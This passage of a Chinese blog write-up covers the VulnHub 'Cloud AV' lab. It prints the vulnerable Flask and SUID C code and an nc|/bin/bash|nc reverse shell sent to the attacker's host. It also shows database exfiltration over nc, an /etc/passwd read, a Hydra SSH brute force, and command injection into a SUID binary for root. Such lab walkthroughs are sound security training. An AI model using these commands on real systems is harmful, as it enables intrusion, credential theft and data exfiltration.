+<p>故<strong>采用多个</strong>管道符（|），此法暂且称为“<strong>nc管道符串联</strong>”</p>
+<p>在Kali上同时监听5555和6666端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 5555</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 6666</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009145202343.png" alt="image-20211009145202343"></p>
+<p>在浏览器端 采用“nc管道符串联”：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello | nc 10.0.2.4 5555 | /bin/bash | nc 10.0.2.4 6666 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009145552070.png" alt="image-20211009145552070"></p>
+<p>kali端显示两个端口都成功连接</p>
+<h3 id="5-信息收集-x2F-ssh爆破"><a href="#5-信息收集-x2F-ssh爆破" class="headerlink" title="5.信息收集&#x2F;ssh爆破"></a>5.信息收集&#x2F;ssh爆破</h3><p>尝试在5555端口监听窗口输入命令，发现执行结果会在6666端口监听窗口显示，成功</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009145754300.png" alt="image-20211009145754300"></p>
+<p>登录到目标系统后，查看文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009151033812.png" alt="image-20211009151033812"></p>
+<p>查看app.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat app.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009151112767.png" alt="image-20211009151112767"></p>
+<blockquote>
+<p>from flask import Flask, render_template, request, session<br>import sqlite3<br>import subprocess<br>import os</p>
+<p>conn &#x3D; sqlite3.connect(‘database.sql’,check_same_thread &#x3D; False)<br>c &#x3D; conn.cursor()</p>
+<p>app &#x3D; Flask(<strong>name</strong>)</p>
+<p>@app.route(‘&#x2F;‘)<br>def index():<br>   return render_template(‘index.html’)</p>
+<p>@app.route(‘&#x2F;login’, methods&#x3D;[‘POST’])<br>def login():<br>   password &#x3D; request.form[‘password’]<br>   if len(c.execute(‘select * from code where password&#x3D;”‘ + password + ‘“‘).fetchall()) &gt; 0:<br>       session[‘logged_in’] &#x3D; True<br>       return ‘Redirecting to &#x2F;scan. <meta http-equiv="refresh" content="0; url=/scan" />‘<br>   else:<br>       return “WRONG INFORMATION”</p>
+<p>@app.route(‘&#x2F;scan’)<br>def shop():<br>   if session.get(‘logged_in’):<br>       filelist &#x3D; subprocess.Popen(“ls -l &#x2F;home&#x2F;scanner&#x2F;cloudav_app&#x2F;samples”, shell&#x3D;True, stdout&#x3D;subprocess.PIPE, stderr&#x3D;subprocess.PIPE, stdin&#x3D;subprocess.PIPE).stdout.read()<br>       return render_template(‘scan.html’,filelist&#x3D;filelist)<br>   else:<br>       return ‘<meta http-equiv="refresh" content="0; url=/" />‘</p>
+<p>@app.route(‘&#x2F;output’, methods&#x3D;[‘POST’])<br>def output():<br>   if session.get(‘logged_in’):<br>       filename &#x3D; request.form[‘filename’]<br>       scan_results &#x3D; subprocess.Popen(“clamscan “+filename, shell&#x3D;True, stdout&#x3D;subprocess.PIPE, stderr&#x3D;subprocess.PIPE, stdin&#x3D;subprocess.PIPE).stdout.read()<br>       return “<pre>" + scan_results + "</pre>“<br>   else:<br>       return ‘<meta http-equiv="refresh" content="0; url=/" />‘</p>
+<p>if <strong>name</strong> &#x3D;&#x3D; “<strong>main</strong>“:<br>   app.secret_key &#x3D; os.urandom(12)<br>   app.run(host&#x3D;’0.0.0.0’,port&#x3D;8080, debug&#x3D;True)</p>
+</blockquote>
+<p>app.py中并没有可以直接有关提权的信息</p>
+<p>查看database.sql</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file database.sql</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009151631066.png" alt="image-20211009151631066"></p>
+<p>发现数据库版本信息SQLite 3.x，再结合之前sql注入时的页面返回信息</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009152025908.png" alt="image-20211009152025908"></p>
+<p>版本信息一致，猜测是Web应用程序服务端的数据库，有可能有隐私数据，所以就有必要查看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlite</span><br></pre></td></tr></table></figure>
+
+<p>尝试执行发现没有相关指令</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009151902078.png" alt="image-20211009151902078"></p>
+<p>即<strong>服务端无法解析</strong>sqlite文件，那是否可以将下载到kali本机上，使用kali本机上sqlite的执行环节来查看文件database.sql</p>
+<p>在Kali端新窗口开启nc监听7777端口，将接收到的所有<strong>连接请求都转发到</strong>db.sql文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 7777 &gt; db.sql</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009152136352.png" alt="image-20211009152136352"></p>
+<p>在监听5555端口的窗口内，连接10.0.2.4（kali）的7777端口<strong>再通过重定向</strong>将database.sql传输到nc通道内</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.0.2.4 7777 &lt; database.sql</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009152503151.png" alt="image-20211009152503151"></p>
+<p>database.sql文件不大，很快传输完Ctrl+C结束</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009152617144.png" alt="image-20211009152617144"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009152646495.png" alt="image-20211009152646495"></p>
+<p>使用kali的sqlite3环境下查看db.sql</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlite3</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.open db.sql</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.database</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009152831159.png" alt="image-20211009152831159"></p>
+<p>显示只有一个字段password,下方的INSERT语句向数据库添加了几个密码，那是否可以登录目标系统？回想发现阶段目标系统上开启ssh服务，所以进行尝试，现在寻找目标系统上的用户名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009153106205.png" alt="image-20211009153106205"></p>
+<p>passwd文件中数据很多，需要做筛选过滤</p>
+<p>筛选可以用<strong>shell权限</strong>登录系统的账号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd | grep /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009153238876.png" alt="image-20211009153238876"></p>
+<p>将用户名和密码都分别生成字典 准备进行爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi user.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009153516608.png" alt="image-20211009153516608"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009153446916.png" alt="image-20211009153446916"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi pass.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009153702323.png" alt="image-20211009153702323"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009153648892.png" alt="image-20211009153648892"></p>
+<p>使用Hydra爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P pass.txt ssh://10.0.2.7</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009154535990.png" alt="image-20211009154535990"></p>
+<p>破解完成，失望，没有正确结果，这种攻击失败了，尝试别的攻击手段</p>
+<h3 id="6-SUID提权"><a href="#6-SUID提权" class="headerlink" title="6.SUID提权"></a>6.SUID提权</h3><p>回到目标机目录下，尝试查看目录下别的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls samples</span><br></pre></td></tr></table></figure>
+
+<p>发现这些文件就是Web界面那些可以进行防病毒扫描的文件</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009160341754.png" alt="image-20211009160341754"></p>
+<p>暂时没有发现有帮助的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls templates</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009160512163.png" alt="image-20211009160512163"></p>
+<p>看到template下有两个<strong>Web开发页面模板文件</strong> index.html scan.html，但也没有有帮助的信息</p>
+<p>查看查看的目录，确认现在所在目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009164418370.png" alt="image-20211009164418370"></p>
+<p>去上一级目录，&#x2F;home&#x2F;scanner</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd .. </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la     #查看隐藏文件</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls- l</span><br></pre></td></tr></table></figure>
+
+<p>在隐藏文件中并未发现有直接帮助的文件，但发现了.c文件</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009165417380.png" alt="image-20211009165417380"></p>
+<p>update_cloudav.c可能就是cloudav.app程序的C语言源代码，且可以看到这个程序的权限是<strong>可执行的</strong>，s也代表有suid权限位，且属主是root账号，当执行该程序时会<strong>默认继承该程序属主的权限</strong></p>
+<p>设想：如果可以执行这个update_cloudav.c，是否可以通过某种命令注入的方法，<strong>利用suid权限</strong>带来的root权限来<strong>执行某些系统命令来反弹shell</strong>，来<strong>完成提权</strong>？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat update_cloudav.c</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>#include &lt;stdio.h&gt;</p>
+<p>int main(int argc, char *argv[])<br>{<br>char *freshclam&#x3D;”&#x2F;usr&#x2F;bin&#x2F;freshclam”;</p>
+<p>if (argc &lt; 2){<br>printf(“This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n”);<br>return 1;<br>}</p>
+<p>char *command &#x3D; malloc(strlen(freshclam) + strlen(argv[1]) + 2);<br>sprintf(command, “%s %s”, freshclam, argv[1]);<br>setgid(0);<br>setuid(0);<br>system(command);<br>return 0;</p>
+<p>}</p>
+</blockquote>
+<p>包含了一些<strong>头文件</strong>，定义了一些<strong>变量</strong>，变量指向了操作系统中的文件freshclam，freshclam是给开源杀毒软件cloudav的病毒库升级的软件。这个程序<strong>定义了一个执行参数</strong>，如果程序在执行过程中<strong>不包含</strong>这个参数的话就会<strong>显示信息</strong>，要求提交一个命令行的参数，这样freshclam这个程序才能正常执行，完成病毒库的更新。如果正确使用参数，那么就会正常的运行cloudav，执行病毒库的更新。</p>
+<p>总结一下：当我们<strong>执行update_cloudav.c时</strong>，会<strong>调用</strong>了cloudav.app的<strong>病毒更新程序freshclam</strong>，但在执行过程中<strong>要求要有运行参数。</strong></p>
+<p>先测试一个参数a</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./update_cloudav a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009165635210.png" alt="image-20211009165635210"></p>
+<p>出现日志文件<strong>报错</strong>，但是不确定是否会对执行有影响，继续尝试</p>
+<p>利用管道符串联</p>
+<p>在kali端: </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 7777 </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 8888</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009165823593.png" alt="image-20211009165823593"></p>
+<p>在控制目标机端：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./update_cloudav &quot;a | nc 10.0.2.4 7777 | /bin/bash | nc 10.0.2.4 8888&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>双引号作用：让.&#x2F;upadte_cloudav程序在执行的时候，认为双引号内的都是参数，从而继承这个程序它的suid位的权限</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009165854532.png" alt="image-20211009165854532"></p>
+<p>成功拿到目标系统root权限！</p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">一、信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">1.主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.</span> <span class="toc-text">2.端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E5%8F%91%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">3.端口服务扫描发现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">二、漏洞发现与利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%AE%BF%E9%97%AE%E9%A1%B5%E9%9D%A2"><span class="toc-number">2.1.</span> <span class="toc-text">1.访问页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%B5%8B%E8%AF%95SQL%E6%B3%A8%E5%85%A5-x2F-%E7%88%86%E7%A0%B4"><span class="toc-number">2.2.</span> <span class="toc-text">2.测试SQL注入&#x2F;爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.</span> <span class="toc-text">3.命令注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%BD%BF%E7%94%A8nc%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.4.</span> <span class="toc-text">4.使用nc建立连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-x2F-ssh%E7%88%86%E7%A0%B4"><span class="toc-number">2.5.</span> <span class="toc-text">5.信息收集&#x2F;ssh爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-SUID%E6%8F%90%E6%9D%83"><span class="toc-number">2.6.</span> <span class="toc-text">6.SUID提权</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://byesec.com/posts/7a8f303.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://byesec.com/posts/7a8f303.html&text=VulnHub-2-BoredHackerBlog:Cloud AV"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://byesec.com/posts/7a8f303.html&title=VulnHub-2-BoredHackerBlog:Cloud AV"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://byesec.com/posts/7a8f303.html&is_video=false&description=VulnHub-2-BoredHackerBlog:Cloud AV"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnHub-2-BoredHackerBlog:Cloud AV&body=Check out this article: http://byesec.com/posts/7a8f303.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://byesec.com/posts/7a8f303.html&title=VulnHub-2-BoredHackerBlog:Cloud AV"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://byesec.com/posts/7a8f303.html&title=VulnHub-2-BoredHackerBlog:Cloud AV"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://byesec.com/posts/7a8f303.html&title=VulnHub-2-BoredHackerBlog:Cloud AV"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://byesec.com/posts/7a8f303.html&title=VulnHub-2-BoredHackerBlog:Cloud AV"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://byesec.com/posts/7a8f303.html&name=VulnHub-2-BoredHackerBlog:Cloud AV&description=&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Name:&lt;/strong&gt; BoredHackerBlog: Cloud AV&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Date release:&lt;/strong&gt; 29 Mar 2020&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Author&lt;/strong&gt;: &lt;a href=&#34;https://www.vulnhub.com/author/boredhackerblog,683/&#34;&gt;BoredHackerBlog&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Series&lt;/strong&gt;: &lt;a href=&#34;https://www.vulnhub.com/series/boredhackerblog,295/&#34;&gt;BoredHackerBlog&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Download：&lt;/strong&gt;&lt;a href=&#34;https://download.vulnhub.com/boredhackerblog/easy_cloudantivirus.ova&#34;&gt;https://download.vulnhub.com/boredhackerblog/easy_cloudantivirus.ova&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Cloud Anti-Virus Scanner! is a cloud-based antivirus scanning service.&lt;/p&gt;
+&lt;p&gt;Currently, it’s in beta mode. You’ve been asked to test the setup and find vulnerabilities and escalate privs.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Difficulty:&lt;/strong&gt; Easy&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Tasks involved:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;port scanning&lt;/li&gt;
+&lt;li&gt;webapp attacks&lt;/li&gt;
+&lt;li&gt;sql injection&lt;/li&gt;
+&lt;li&gt;command injection&lt;/li&gt;
+&lt;li&gt;brute forcing&lt;/li&gt;
+&lt;li&gt;code analysis&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Virtual Machine:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Format: Virtual Machine (Virtualbox OVA)&lt;/li&gt;
+&lt;li&gt;Operating System: Linux&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Networking:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;DHCP Service: Enabled&lt;/li&gt;
+&lt;li&gt;IP Address Automatically assign&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;This works better with VirtualBox rather than VMware.&lt;/p&gt;
+&lt;/blockquote&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://byesec.com/posts/7a8f303.html&t=VulnHub-2-BoredHackerBlog:Cloud AV"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    patrik
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'byesec/blog_utteranc';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
